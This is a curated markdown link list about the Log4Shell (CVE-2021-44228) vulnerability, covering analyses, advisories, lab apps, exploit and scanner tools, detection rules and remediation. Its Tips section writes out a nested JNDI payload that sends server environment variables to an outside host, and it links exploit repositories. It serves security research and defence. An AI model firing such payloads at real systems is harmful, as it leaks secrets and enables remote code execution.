# TL;DR

# Technical analysis
- [Log4j Analysis: More JNDI Injection](https://y4y.space/2021/12/10/log4j-analysis-more-jndi-injection/)
- [Rapid7 analysis](https://attackerkb.com/topics/in9sPR2Bzt/cve-2021-44228-log4shell/rapid7-analysis): Includes PoCs for Apache Struts2, VMWare VCenter, Apache James, Apache Solr, Apache Druid, Apache JSPWiki and Apache OFBiz

# Advisories
- [Apache Log4j Security Vulnerabilities](https://logging.apache.org/log4j/2.x/security.html)

# Videos
- [What do you need to know about the log4j (Log4Shell) vulnerability?](https://www.youtube.com/watch?v=oC2PZB5D3Ys) (First 15 min detail offensive side pretty well)
- [CVE-2021-44228 - Log4j - MINECRAFT VULNERABLE! (and SO MUCH MORE)](https://www.youtube.com/watch?v=7qoPDq41xhQ)
- [Quick demo by @MalwareTechBlog](https://www.youtube.com/watch?v=0-abhd-CLwQ)
- [Log4Shell, The Worst Java Vulnerability in Years](https://www.youtube.com/watch?v=m_AkCbFc8DM)

# Intentionally vulnerable apps
- [PentesterLab challenge](https://pentesterlab.com/exercises/log4j_rce/course)
- [BugHuntr.io scenario](https://twitter.com/BugHuntrIo/status/1469298538593067012)
- [christophetd/log4shell-vulnerable-app](https://github.com/christophetd/log4shell-vulnerable-app)

# Tools & Exploits
- [tangxiaofeng7/CVE-2021-44228-Apache-Log4j-Rce](https://github.com/tangxiaofeng7/CVE-2021-44228-Apache-Log4j-Rce)
- [Thinkst Canary](https://twitter.com/thinkstcanary/status/1469439743905697797)
- [Huntress Log4Shell Tester](https://log4shell.huntress.com)
- [log4shell.nse](https://github.com/righel/log4shell_nse): Nmap NSE script that injects a Huntress/CanaryTokens/custom log4shell payload in HTTP requests described by JSON templates
- [@SilentSignalHU’s Log4Shell Scanner as a Burp extension](https://twitter.com/Burp_Suite/status/1470418532475314177) & [silentsignal/burp-log4shell](https://github.com/silentsignal/burp-log4shell) (Burp extension)
- [Log4Shell detection to ActiveScan++](https://twitter.com/albinowax/status/1469258291616403457)
- [fullhunt/log4j-scan](https://github.com/fullhunt/log4j-scan)
- [Burp Bounty Pro Profile](https://twitter.com/BurpBounty/status/1469249786092085249)
- [whwlsfb/Log4j2Scan](https://github.com/whwlsfb/Log4j2Scan) (Passive Scanner plugin for Burp)
- [Semgrep rules](https://github.com/returntocorp/semgrep-rules/tree/develop/java/log4j/security)
- [CodeQL query](https://github.com/cldrn/codeql-queries/blob/master/log4j-injection.ql)
  - <https://twitter.com/pwntester/status/1469307027067396106>

- [log4shell-detector](https://github.com/Neo23x0/log4shell-detector)
- [Nuclei template](https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2021/CVE-2021-44228.yaml)

# Tips
- The Log4J formatting is nestable which means payloads like `${jndi:ldap://${env:user}.xyz.collab.com/a}` will leak server side env vars! [Source](https://twitter.com/_StaticFlow_/status/1469358229767475205)
- [Tutorial on setting up RogueJDNI](https://twitter.com/ITSecurityguard/status/1469347404986077185)

# WAF bypasses

# Mega threads
- [Reddit mega thread curated by NCC Group](https://www.reddit.com/r/blueteamsec/comments/rd38z9/log4j_0day_being_exploited/)

# Remediation
- [Guide: How To Detect and Mitigate the Log4Shell Vulnerability (CVE-2021-44228)](https://www.lunasec.io/docs/blog/log4j-zero-day-mitigation-guide/)

# Some impacted apps/vendors
- [YfryTchsGD/Log4jAttackSurface](https://github.com/YfryTchsGD/Log4jAttackSurface)
  - <https://twitter.com/bl4sty/status/1469259842112086024>
  - [Log4j zero-day gets security fix just as scans for vulnerable systems ramp up](https://therecord.media/log4j-zero-day-gets-security-fix-just-as-scans-for-vulnerable-systems-ramp-up/)
- [20211210-TLP-WHITE_LOG4J.md](https://gist.github.com/SwitHak/b66db3a06c2955a9cb71a8718970c592)
- [ZAP](https://www.zaproxy.org/blog/2021-12-10-zap-and-log4shell/)
- [Ingenuity, the Mars 2020 Helicopter mssion](https://twitter.com/TheASF/status/1400875147163279374)
- [VCenter](https://twitter.com/w3bd3vil/status/1469814463414951937)
- [Ghidra](https://twitter.com/zhuowei/status/1469186818549719042)
- [Apache JAMES SMTP server](https://twitter.com/dlitchfield/status/1469809966785564675)
